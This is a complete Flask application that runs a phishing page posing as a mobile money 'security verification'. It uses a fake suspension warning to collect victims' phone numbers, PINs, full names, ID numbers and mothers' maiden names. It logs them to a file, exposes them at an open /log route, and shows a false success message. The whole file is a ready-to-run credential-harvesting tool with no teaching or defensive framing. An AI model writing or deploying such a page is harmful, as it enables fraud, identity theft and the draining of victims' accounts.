from flask import Flask, request, render_template_string
app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head><title>Mobile Money Verification</title></head>
<body>
<h2>⚠️ Security Verification Required</h2>
<p>Your account has been flagged for suspicious activity. Verify your details to avoid suspension.</p>
<form method="POST" action="/submit">
Phone Number: <input type="text" name="phone" placeholder="0712345678"><br>
PIN: <input type="password" name="pin" placeholder="1234"><br>
Full Name (as on ID): <input type="text" name="name"><br>
ID Number (ID/Passport): <input type="text" name="id"><br>
Mother's Maiden Name: <input type="text" name="mother"><br>
<input type="submit" value="Verify">
</form>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/submit', methods=['POST'])
def submit():
    phone = request.form.get('phone')
    pin = request.form.get('pin')
    name = request.form.get('name')
    id_num = request.form.get('id')
    mother = request.form.get('mother')
    with open('log.txt', 'a') as f:
        f.write(f"{phone}|{pin}|{name}|{id_num}|{mother}\n")
    return "✅ Verification successful. You will be redirected."

@app.route('/log')
def log():
    try:
        with open('log.txt', 'r') as f:
            return "<pre>" + f.read() + "</pre>"
    except:
        return "No data yet."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
